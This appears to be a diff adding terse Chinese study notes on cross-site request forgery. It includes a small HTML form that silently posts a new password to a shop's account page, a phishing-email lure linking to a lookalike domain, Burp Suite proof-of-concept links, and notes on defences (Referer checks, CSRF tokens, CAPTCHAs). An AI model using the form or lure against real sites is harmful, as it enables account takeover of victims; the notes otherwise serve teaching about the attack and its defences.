@@ -1,0 +1,48 @@
+跨站请求伪造
+
+hackerswebsite.com
+sh0p.com/account.php
+
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<form action="http://shop.com/account.php" method="post">
+    <input id="pwd" name="pwd" type="password" value="123456"/>
+    <button type="submit">Submit</button>
+</form>
+</body>
+</html>
+
+钓鱼邮件 peter 商城 3000个积分 <a href="http://sh0p.com/account.php">点击领取</a>
+
+
+
+sessionid
+
+PoC Proof of Concept 概念验证 概念证明 网络安全 漏洞验证 漏洞证明
+
+商城 3000个积分 <a href="http://burpsuite/show/1/z5rm2gq6uuremjoz7pizugy9euh0q2ei">点击领取</a>
+
+http://burpsuite/show/7/686i1483z9s3kt19qawed6k7kthk1e9b
+
+1 Referer 头 访问来源 (Referrer)  不太可靠
+    aaashop.com
+2 CSRF token
+    huajian token
+    peter token
+3 验证码
+    图片 短信验证 ...
+    huajian zxcv
+    peter   qwer
+
+if 有token
+    token 检验  
+
+token 跟 user 不是强关联
+
+请求伪造
+
+
+
